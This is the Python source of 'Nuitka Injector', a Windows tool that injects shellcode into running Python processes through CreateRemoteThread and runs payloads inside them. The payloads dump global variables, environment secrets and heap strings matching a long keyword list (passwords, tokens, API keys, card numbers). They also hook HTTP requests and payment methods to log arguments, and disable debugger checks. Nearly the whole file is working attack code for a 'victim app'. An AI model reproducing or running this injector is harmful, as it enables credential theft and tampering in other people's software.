import sys
import os
import ctypes
import base64
import struct
import re
from ctypes import wintypes
from typing import List, Dict

try:
    import psutil
    import pymem
    import pymem.process
    import pefile
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt
    from rich import box
except ImportError as e:
    print(f"[ERROR] Missing dependency: {e}")
    sys.exit(1)

console = Console()



kernel32 = ctypes.windll.kernel32
advapi32 = ctypes.windll.advapi32

kernel32.CreateRemoteThread.argtypes = [
    wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t, 
    ctypes.c_void_p, ctypes.c_void_p, wintypes.DWORD, ctypes.c_void_p
]
kernel32.CreateRemoteThread.restype = wintypes.HANDLE

SE_DEBUG_NAME = "SeDebugPrivilege"
SE_PRIVILEGE_ENABLED = 0x00000002


class LUID(ctypes.Structure):
    _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]

class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("Luid", LUID), ("Attributes", wintypes.DWORD)]

class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [("PrivilegeCount", wintypes.DWORD),
                ("Privileges", LUID_AND_ATTRIBUTES * 1)]

def is_admin() -> bool:
    try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except: return False

def enable_debug_privilege() -> bool:
    try:
        h_token = wintypes.HANDLE()
        if not advapi32.OpenProcessToken(kernel32.GetCurrentProcess(), 0x0028, ctypes.byref(h_token)): 
            return False

        luid = LUID()
        if not advapi32.LookupPrivilegeValueW(None, SE_DEBUG_NAME, ctypes.byref(luid)):
            kernel32.CloseHandle(h_token)
            return False

        tp = TOKEN_PRIVILEGES()
        tp.PrivilegeCount = 1
        tp.Privileges[0].Luid = luid
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

        if not advapi32.AdjustTokenPrivileges(h_token, False, ctypes.byref(tp), ctypes.sizeof(tp), None, None):
            kernel32.CloseHandle(h_token)
            return False

        if kernel32.GetLastError() == 1300: 
            kernel32.CloseHandle(h_token)
            return False

        kernel32.CloseHandle(h_token)
        return True
    except: return False

class SYSTEM_INFO(ctypes.Structure):
    _fields_ = [("wProcessorArchitecture", wintypes.WORD),
                ("wReserved", wintypes.WORD),
                ("dwPageSize", wintypes.DWORD),
                ("lpMinimumApplicationAddress", ctypes.c_void_p),
                ("lpMaximumApplicationAddress", ctypes.c_void_p),
                ("dwActiveProcessorMask", ctypes.c_void_p),
                ("dwNumberOfProcessors", wintypes.DWORD),
                ("dwProcessorType", wintypes.DWORD),
                ("dwAllocationGranularity", wintypes.DWORD),
                ("wProcessorLevel", wintypes.WORD),
                ("wProcessorRevision", wintypes.WORD)]

def get_arch(pid: int) -> str:
    sys_info = SYSTEM_INFO()
    kernel32.GetNativeSystemInfo(ctypes.byref(sys_info))

    os_arch_x64 = (sys_info.wProcessorArchitecture == 9)

    if not os_arch_x64:
        return "x86"

    h = None
    try:
        h = kernel32.OpenProcess(0x1000, False, pid) # PROCESS_QUERY_LIMITED_INFORMATION
        if not h: return "Unknown"
        
        wow64 = ctypes.c_bool()
        if not kernel32.IsWow64Process(h, ctypes.byref(wow64)):
            return "Unknown"
            
        return "x86" if wow64.value else "x64"
    except: 
        return "Unknown"
    finally:
        if h: kernel32.CloseHandle(h)

def scan_procs() -> List[Dict]:
    res = []
    for p in psutil.process_iter(['pid', 'name']):
        try:
            pid = p.info['pid']
            proc = psutil.Process(pid)
            dlls = [m.path for m in proc.memory_maps()]
            py_dlls = [d for d in dlls if 'python' in d.lower() and d.lower().endswith('.dll')]
            
            if py_dlls:
                dll_path = py_dlls[0]
                dll_name = os.path.basename(dll_path)
                ver_m = re.search(r'python(\d)(\d+)', dll_name.lower())
                ver = f"{ver_m.group(1)}.{ver_m.group(2)}" if ver_m else "??"
                res.append({
                    'pid': pid, 'name': p.info['name'], 'ver': ver,
                    'dll_path': dll_path, 'dll_name': dll_name, 'arch': get_arch(pid)
                })
        except: continue
    return res



def get_common_header() -> str:
    return r"""
import sys
import os

def save_log(filename, lines):
    text = "\n".join(lines)
    paths = [
        "C:\\" + filename,
        os.path.join(os.environ.get("TEMP", "C:\\"), filename)
    ]
    for p in paths:
        try:
            with open(p, "w", encoding="utf-8") as f:
                f.write(text)
            break
        except: continue
"""

# начало пейлоадов
    
def payload_dumper() -> str:
    return get_common_header() + r"""
def run():
    lines = ["[*] Dumping Global Scope (__main__)"]
    try:
        import __main__

        g_vars = vars(__main__)
        for name, val in g_vars.items():
            if not name.startswith("__"):
                lines.append(f"VAR: {name} = {str(val)}")
                
                try:
                    if hasattr(val, '__dict__'):
                        lines.append(f"  -> INSIDE {name}: {str(vars(val))}")
                except: pass

    except Exception as e: lines.append("Error: " + str(e))
    save_log("nuitka_full_dump.txt", lines)
try: run()
except: pass
"""

def payload_inspector() -> str:
    return get_common_header() + r"""
def run():
    lines = ["[*] Inspecting Target Class Structure"]
    try:
        import __main__
        
        
        found_classes = []
        
        for name in dir(__main__):
            if name.startswith("__"): continue
            
            val = getattr(__main__, name)
            if isinstance(val, type):
                found_classes.append(val)

        if not found_classes:
            lines.append("[-] No custom classes found in __main__.")
            lines.append("[*] The target might be using functions only or obfuscated imports.")
        else:
            lines.append(f"[*] Discovered {len(found_classes)} classes via Reflection:")
            
            for cls in found_classes:
                lines.append("")
                lines.append("="*40)
                lines.append(f"[+] CLASS: {cls.__name__}")
                lines.append("="*40)
                
                count = 0
                for item in dir(cls):
                    if item.startswith("__"): continue
                    
                    try:
                        attr = getattr(cls, item)
                        attr_type = type(attr).__name__
                        
                        if callable(attr):
                            lines.append(f"    [M] {item}() -> {attr_type}")
                        else:
                            val_str = str(attr)
                            if len(val_str) > 50: val_str = val_str[:47] + "..."
                            lines.append(f"    [V] {item} = {val_str} ({attr_type})")
                        count += 1
                    except:
                        lines.append(f"    [?] {item} (Access Denied)")
                
                if count == 0:
                    lines.append("    (No public methods or attributes found)")

    except Exception as e:
        lines.append(f"[-] Inspector Error: {e}")

    save_log("nuitka_inspector.txt", lines)

try: run()
except: pass
"""

def payload_fuzzer() -> str:
    return get_common_header() + r"""
def run():
    lines = ["[*] Probing Method Arguments (Fuzzing)"]
    try:
        import __main__

        # (!) конфигурация: таргет для фаззера
        
        # имя класса, который хотим сломать
        TARGET_CLASS_NAME = "PaymentProcessor" 
        
        # имя метода, который вызовем без аргументов, чтобы получить сигнатуру
        TARGET_METHOD_NAME = "process_transaction"

        # -------------------------------------------------------------------------
        
        lines.append(f"[*] Target: {TARGET_CLASS_NAME}.{TARGET_METHOD_NAME}")

        # ищем класс
        cls = getattr(__main__, TARGET_CLASS_NAME, None)
        if not cls:
            lines.append(f"[-] Class '{TARGET_CLASS_NAME}' not found.")
            lines.append("[*] Update payload_fuzzer() with correct target names.")
        else:
            # создаем экземпляр
            try:
                inst = cls()
                
                # ищем метод
                if not hasattr(inst, TARGET_METHOD_NAME):
                     lines.append(f"[-] Method '{TARGET_METHOD_NAME}' not found.")
                else:
                    method_to_call = getattr(inst, TARGET_METHOD_NAME)
                    
                    # атака: вызываем пустой метод
                    lines.append("[*] Fuzzing: calling method with NO arguments...")
                    try:
                        method_to_call()
                        lines.append("[?] Unexpected Success (Method takes no args?)")
                    except TypeError as e:
                        # пайтон сам расскажет, какие аргументы нужны
                        lines.append("[!] SIGNATURE LEAKED via TypeError:")
                        lines.append(f"    >> {e}")
                    except Exception as e:
                        lines.append(f"[-] Runtime Error: {e}")

            except Exception as e:
                lines.append(f"[-] Instantiation Error (Failed to create object): {e}")

    except Exception as e:
        lines.append(f"[-] Fuzzer Fatal Error: {e}")

    save_log("nuitka_fuzzer_log.txt", lines)

try: run()
except: pass
"""

def payload_payday() -> str:
    return get_common_header() + r"""
def run():
    lines = ["[*] Executing Custom Payday Payload"]
    try:
        import __main__

        # =======================================================
        # (!) напиши свой код тут
        # =======================================================

        # --- YOUR CODE: ---
        lines.append("[!] No custom payload defined yet.")
        lines.append("[*] Edit payload_payday() in injector.py to add logic.")

        # =======================================================

    except Exception as e:
        lines.append(f"[-] Payload Error: {e}")

    save_log("nuitka_payday_log.txt", lines)

try: run()
except: pass
"""

def payload_anti_anti_debug() -> str:
    return get_common_header() + r"""
def run():
    lines = ["[*] Executing Anti-Anti-Debug bypass"]
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            ctypes.windll.kernel32.IsDebuggerPresent.restype = ctypes.c_int
            ctypes.windll.kernel32.IsDebuggerPresent = lambda: 0
            lines.append("[+] Stealth hooks installed (IsDebuggerPresent -> 0)")
        else:
            lines.append("[-] Stealth skipped (no ctypes)")
    except Exception as e: 
        lines.append(f"[-] Error: {e}")
    
    save_log("nuitka_anti_anti_debug.txt", lines)
try: run()
except: pass
"""


def payload_deep_scan() -> str:
    return get_common_header() + r"""
import gc

def run():
    lines = ["[*] Analyzing Python Objects (GC dump)"]
    lines.append("Scanning heap for strings and bytes...")
    
    keywords = [
    b'pass',
    b'passwd',
    b'password',
    b'pwd',
    b'secret',
    b'secret_key',
    b'private',
    b'private_key',
    b'public_key',
    b'key',
    b'api',
    b'api_key',
    b'apikey',
    b'token',
    b'access_token',
    b'refresh_token',
    b'auth',
    b'authorization',
    b'bearer',
    b'credential',
    b'credentials',
    b'postgres',
    b'postgresql',
    b'pgsql',
    b'mysql',
    b'mariadb',
    b'sqlite',
    b'oracle',
    b'mssql',
    b'redis',
    b'mongodb',
    b'cassandra',
    b'db',
    b'database',
    b'jdbc',
    b'dsn',
    b'http://',
    b'https://',
    b'ws://',
    b'wss://',
    b'ftp://',
    b'api/',
    b'/api',
    b'endpoint',
    b'callback',
    b'webhook',
    b'upload',
    b'download',
    b'admin',
    b'root',
    b'superuser',
    b'user',
    b'username',
    b'login',
    b'email',
    b'role',
    b'roles',
    b'permission',
    b'permissions',
    b'payment',
    b'pay',
    b'billing',
    b'invoice',
    b'transaction',
    b'amount',
    b'balance',
    b'credit',
    b'debit',
    b'card',
    b'cc_number',
    b'cvv',
    b'aws',
    b'aws_access_key',
    b'aws_secret',
    b's3',
    b'azure',
    b'gcp',
    b'google',
    b'firebase',
    b'slack',
    b'discord',
    b'telegram',
    b'bot_token',
    b'debug',
    b'dev',
    b'test',
    b'staging',
    b'prod',
    b'production',
    b'local',
    b'todo',
    b'fixme',
    b'hook',
    b'hooked',
    b'patch',
    b'monkey',
    b'inject',
    b'intercept',
    b'override',
    b'wrap',
    b'proxy',
    b'middleware',
    b'nuitka',
    b'pyinstaller',
    b'__main__',
    b'compiled',
    b'bootstrap',
    b'runtime',
]
    count = 0
    
    try:
        all_objects = gc.get_objects()
        for obj in all_objects:
            if isinstance(obj, str):
                if len(obj) < 300 and len(obj) > 4:
                    try: val_bytes = obj.encode('utf-8', 'ignore').lower()
                    except: continue
                    
                    if any(k in val_bytes for k in keywords):
                        if b"lib\\" not in val_bytes and b"site-packages" not in val_bytes:
                            lines.append(f"[FOUND STR] {repr(obj)}")
                            count += 1
                            
            elif isinstance(obj, (bytes, bytearray)):
                if len(obj) < 300 and len(obj) > 4:
                    val_lower = obj.lower()
                    if any(k in val_lower for k in keywords):
                        lines.append(f"[FOUND BYTES] {obj}")
                        count += 1
                        
    except Exception as e:
        lines.append(f"Scan interrupted: {e}")
        
    lines.append("-" * 30)
    lines.append(f"Total secrets found: {count}")
    save_log("nuitka_deepscan.txt", lines)

try: run()
except: pass
"""

def payload_mitm() -> str:
    return get_common_header() + r"""
def run():
    lines = ["[*] Installing MITM Hooks"]
    try:
        import __main__
        import functools

        # (!) конфигурация
        
        # какое имя класса искать? (оставь None, если функция глобальная)
        TARGET_CLASS_NAME = "PaymentProcessor"  
        
        # какое имя метода перехватывать?
        TARGET_METHOD_NAME = "process_transaction" 
        

        def spy_decorator(original_func):
            @functools.wraps(original_func)
            def wrapper(*args, **kwargs):
                # логируем перехват
                lines.append(f"[>>] INTERCEPTED call to {TARGET_METHOD_NAME}")
                lines.append(f"     Args: {args} | Kwargs: {kwargs}")
                
                # (опционально) можем подменить аргументы тут
                # new_args = list(args)
                # if len(new_args) > 1: new_args[1] = 1337 
                
                # вызываем настоящую функцию
                try:
                    result = original_func(*args, **kwargs)
                    lines.append(f"[<<] Returned: {result}")
                    return result
                except Exception as e:
                    lines.append(f"[!!] Exception in original func: {e}")
                    raise e
            return wrapper

        # логика установки хука
        target_cls = getattr(__main__, TARGET_CLASS_NAME, None)
        if target_cls:
            if hasattr(target_cls, TARGET_METHOD_NAME):
                original = getattr(target_cls, TARGET_METHOD_NAME)
                setattr(target_cls, TARGET_METHOD_NAME, spy_decorator(original))
                lines.append(f"[+] Hook installed on {TARGET_CLASS_NAME}.{TARGET_METHOD_NAME}")
            else:
                lines.append(f"[-] Method {TARGET_METHOD_NAME} not found in class.")
        else:
             lines.append(f"[-] Class {TARGET_CLASS_NAME} not found.")

    except Exception as e:
        lines.append(f"[-] MITM Error: {e}")

    save_log("nuitka_mitm_log.txt", lines)

try: run()
except: pass
"""

def payload_http_spy() -> str:
    return get_common_header() + r"""
def run():
    lines = ["[*] Starting HTTP/HTTPS Sniffer"]
    try:
        import sys
        import os
        
        if 'requests' not in sys.modules:
            lines.append("[-] 'requests' module not loaded in target.")
            save_log("nuitka_http_spy.txt", lines)
            return

        import requests
        lines.append("[+] Hooking requests.Session.request")
        
        original_request = requests.Session.request
        
        def new_request(self, method, url, *args, **kwargs):
            log_entry =  f"\n{'='*40}\n"
            log_entry += f"[TIME] Request Intercepted\n"
            log_entry += f"[REQ]  {method.upper()} {url}\n"
            
            headers = kwargs.get('headers')
            if headers: log_entry += f"[HDR]  {headers}\n"
            
            data = kwargs.get('data')
            if data:    log_entry += f"[DAT]  {data}\n"
            
            json_data = kwargs.get('json')
            if json_data: log_entry += f"[JSN]  {json_data}\n"
            
            try:
                path = os.path.join(os.environ.get("TEMP", "C:\\"), "nuitka_http_spy.txt")
                with open(path, "a", encoding="utf-8") as f:
                    f.write(log_entry)
            except: pass
            
            return original_request(self, method, url, *args, **kwargs)
            
        requests.Session.request = new_request
        lines.append("[*] Sniffer active. Check log file for updates.")

    except Exception as e:
        lines.append(f"[-] Sniffer Error: {e}")
    
    save_log("nuitka_http_spy.txt", lines)

try: run()
except: pass
"""

def payload_env_dump() -> str:
    return get_common_header() + r"""
def run():
    lines = ["[*] Analyzing Process Environment"]
    try:
        import os
        
        keywords = [
            'KEY', 'TOKEN', 'SECRET', 'PASS', 'AUTH', 'CRED',
            'AWS', 'AZURE', 'GCP', 'GOOGLE', 'CLOUD',      
            'DB', 'URL', 'CONNECTION', 'DSN', 'HOST',   
            'API', 'CLIENT', 'USER', 'ADMIN', 'LOGIN',    
            'PRIVATE', 'CERT', 'SSH', 'SALT', 'BUCKET'     
        ]
        
        env_vars = dict(os.environ)
        
        if not env_vars:
            lines.append("[-] Environment is empty.")
        else:
            lines.append(f"[*] Total variables: {len(env_vars)}\n")
            
            lines.append("--- [ Priority Keys ] ---")
            found_secrets = False
            for k, v in env_vars.items():
                if any(x in k.upper() for x in keywords):
                    lines.append(f"{k} = {v}")
                    found_secrets = True
            
            if not found_secrets: lines.append("(No sensitive keys detected via keywords)")
            
            lines.append("\n--- [ System Environment ] ---")
            for k, v in sorted(env_vars.items()):
                if not any(x in k.upper() for x in keywords):
                    lines.append(f"{k} = {v}")

    except Exception as e:
        lines.append(f"[-] Error: {e}")
    
    save_log("nuitka_env.txt", lines)

try: run()
except: pass
"""

def get_remote_func(pm, dll_path, func_name):
    try:
        pe = pefile.PE(dll_path)
        
        func_rva = None
        func_name_b = func_name.encode('utf-8') 
        
        export_directory = None
        for d in pe.OPTIONAL_HEADER.DATA_DIRECTORY:
            if d.name == 'IMAGE_DIRECTORY_ENTRY_EXPORT':
                export_directory = d
                break

        if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
            for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
                if exp.name and exp.name == func_name_b:
                    
                    if export_directory and \
                       export_directory.VirtualAddress <= exp.address < export_directory.VirtualAddress + export_directory.Size:
                        console.print(f"[yellow][!] Skipped forwarder export: {func_name}[/yellow]")
                        return 0
                        
                    func_rva = exp.address
                    break
        
        pe.close()
        
        if not func_rva:
            return 0
            
        remote_mod = pymem.process.module_from_name(pm.process_handle, os.path.basename(dll_path))
        if not remote_mod:
            return 0
            
        return remote_mod.lpBaseOfDll + func_rva

    except Exception as e:
        console.print(f"[red][!] Error resolving address for {func_name}: {e}[/red]")
        return 0

def inject(pid: int, dll_path: str, payload: str, arch: str) -> bool:
    try:
        pm = pymem.Pymem(pid)
        addr_run = get_remote_func(pm, dll_path, "PyRun_SimpleString")
        addr_ensure = get_remote_func(pm, dll_path, "PyGILState_Ensure")
        addr_release = get_remote_func(pm, dll_path, "PyGILState_Release")
        
        if not (addr_run and addr_ensure and addr_release):
            console.print("[red]✗ Failed to resolve Python API (Check arch mismatch)[/red]")
            return False

        payload_b64 = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
        loader_code = f"import base64; exec(base64.b64decode('{payload_b64}'))"  
        b_payload = loader_code.encode('utf-8') + b'\x00'

        mem_data = pm.allocate(len(b_payload))
        pm.write_bytes(mem_data, b_payload, len(b_payload))
        
        if arch == "x86":
            # шеллкод для x86 (32 бит)
            pack_fmt = '<I'
            sc = b'\xB8\xAA\xAA\xAA\xAA\xFF\xD0\x89\xC6\x68\xBB\xBB\xBB\xBB\xB8\xCC\xCC\xCC\xCC\xFF\xD0\x83\xC4\x04\x56\xB8\xDD\xDD\xDD\xDD\xFF\xD0\x83\xC4\x04\xC3'
            
            sc = sc.replace(b'\xAA' * 4, struct.pack(pack_fmt, addr_ensure))
            sc = sc.replace(b'\xBB' * 4, struct.pack(pack_fmt, mem_data))
            sc = sc.replace(b'\xCC' * 4, struct.pack(pack_fmt, addr_run))
            sc = sc.replace(b'\xDD' * 4, struct.pack(pack_fmt, addr_release))
            
        else:
            # шеллкод для x64
            pack_fmt = '<Q'
            sc = b'\x48\x83\xEC\x28\x48\xB8\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xFF\xD0\x48\x89\xC3\x48\xB9\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\x48\xB8\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xFF\xD0\x48\x89\xD9\x48\xB8\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xDD\xFF\xD0\x48\x83\xC4\x28\xC3'
            
            sc = sc.replace(b'\xAA' * 8, struct.pack(pack_fmt, addr_ensure))
            sc = sc.replace(b'\xBB' * 8, struct.pack(pack_fmt, mem_data))
            sc = sc.replace(b'\xCC' * 8, struct.pack(pack_fmt, addr_run))
            sc = sc.replace(b'\xDD' * 8, struct.pack(pack_fmt, addr_release))

        mem_sc = pm.allocate(len(sc))
        pm.write_bytes(mem_sc, sc, len(sc))
        
        ht = kernel32.CreateRemoteThread(pm.process_handle, None, 0, ctypes.c_void_p(mem_sc), None, 0, None)
        if not ht: return False
        kernel32.WaitForSingleObject(ht, 5000)
        kernel32.CloseHandle(ht)
        return True
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        return False


def show_menu():
    table = Table(title="Payload Selection", box=box.ROUNDED, header_style="")
    table.add_column("ID", style="cyan", justify="center")
    table.add_column("Mode", style="cyan")
    table.add_column("Description", style="white")
    
    table.add_row("1", "Dumper", "Dump variables & secrets from __main__")
    table.add_row("2", "Inspector", "List methods of custom Classes (Universal)")
    table.add_row("3", "Fuzzer", "Call method without args to find signature")
    table.add_row("4", "Payday", "Execute Custom Script")
    table.add_row("5", "Anti-Anti-Debug", "Bypass IsDebuggerPresent & Inject Action")
    table.add_row("6", "Deep Scan", "Scan full memory (GC) for hidden secrets")
    table.add_row("7", "MITM Hook", "Intercept function calls & arguments")
    table.add_row("8", "HTTP Spy", "Log all requests (HTTPS Bypass)")
    table.add_row("9", "Environment", "Dump os.environ (Config & Keys)")
    
    console.print(table)

def main():
    banner_text = "Nuitka Injector — created by reverse engineering team\n                  t.me/ReChamo"
    console.print(Panel(banner_text, style="cyan", expand=False))
    
    if not is_admin(): enable_debug_privilege()
    
    while True:
        procs = scan_procs()
        if not procs:
            retry = Prompt.ask("[yellow]No Python processes. Retry?[/yellow] [cyan][Y / N][/cyan]")
            if not retry.lower().startswith('y'): break
            continue
            
        t = Table(show_header=True, header_style="blue", box=box.ROUNDED)
        t.add_column("PID", style="cyan")
        t.add_column("Name")
        t.add_column("Ver", style="yellow")
        t.add_column("DLL")
        for p in procs: t.add_row(str(p['pid']), p['name'], p['ver'], p['dll_name'])
        console.print(t)
        
        pid_s = Prompt.ask("\nSelect [cyan]PID[/cyan] (or 'q')")
        if pid_s.lower() == 'q': break
        
        tgt = next((p for p in procs if str(p['pid']) == pid_s), None)
        if not tgt:
            console.print("[red]Invalid PID[/red]")
            continue
            
        show_menu()
        mode = Prompt.ask("Select [cyan]Payload Mode[/cyan] [cyan][1-9/q][/cyan]", 
                         choices=["1", "2", "3", "4", "5", "6", "7", "8", "9", "q"], 
                         show_choices=False)
        if mode == 'q': break
        
        payload = ""
        report_file = ""
        
        if mode == "1": payload = payload_dumper(); report_file = "nuitka_full_dump.txt"
        elif mode == "2": payload = payload_inspector(); report_file = "nuitka_inspector.txt"
        elif mode == "3": payload = payload_fuzzer(); report_file = "nuitka_fuzzer_log.txt"
        elif mode == "4": payload = payload_payday(); report_file = "nuitka_payday_log.txt"
        elif mode == "5": payload = payload_anti_anti_debug(); report_file = "nuitka_anti_anti_debug.txt"
        elif mode == "6": payload = payload_deep_scan(); report_file = "nuitka_deepscan.txt"
        elif mode == "7": payload = payload_mitm(); report_file = "nuitka_mitm_log.txt"
        elif mode == "8": payload = payload_http_spy(); report_file = "nuitka_http_spy.txt"
        elif mode == "9": payload = payload_env_dump(); report_file = "nuitka_env.txt"
            
        if inject(tgt['pid'], tgt['dll_path'], payload, tgt['arch']):
            console.print(f"\n[bold green]SUCCESS![/bold green] Payload executed.")
            path = os.path.join(os.environ.get("TEMP", "C:\\"), report_file)
            console.print(f"Report: [underline]{path}[/underline] or C:\\{report_file}\n")
            
            if mode == "7":
                console.print("[bold yellow]NOTE:[/bold yellow] Hook active. Trigger actions in victim app")
                hook_log = os.path.join(os.environ.get('TEMP', 'C:\\'), 'nuitka_mitm_log.txt')
                console.print(f"and check logs at: {hook_log}\n")
        else:
            console.print("\n[bold red]INJECTION FAILED[/bold red]\n")
            
        again = Prompt.ask("Attack another target? [cyan][Y / N][/cyan]")
        if not again.lower().startswith('y'): break

if __name__ == "__main__":
    main()
